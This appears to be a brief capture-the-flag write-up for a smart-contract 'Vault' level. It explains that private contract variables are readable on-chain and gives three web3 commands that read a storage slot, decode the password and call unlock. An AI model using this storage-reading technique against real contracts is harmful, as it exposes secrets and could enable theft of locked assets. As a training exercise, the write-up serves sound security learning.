# Task :
Unlock the vault to pass the level!

# Solution :

If you thought that your private variables were safe you are completely wrong

because all of your variables are stored in a storage slot and that storage slot can be easily accessed since everything is transparent on the blockchain

## Step 1 :

```solidity
await web3.eth.getStorageAt(contract.address, 1)
```
## Step 2 :

```solidity
web3.utils.hexToAscii("/* the Hex you got from Step 1*/")
```
## Step 3 :

```solidity
await contract.unlock("/* the Hex you got from Step 1*/")
```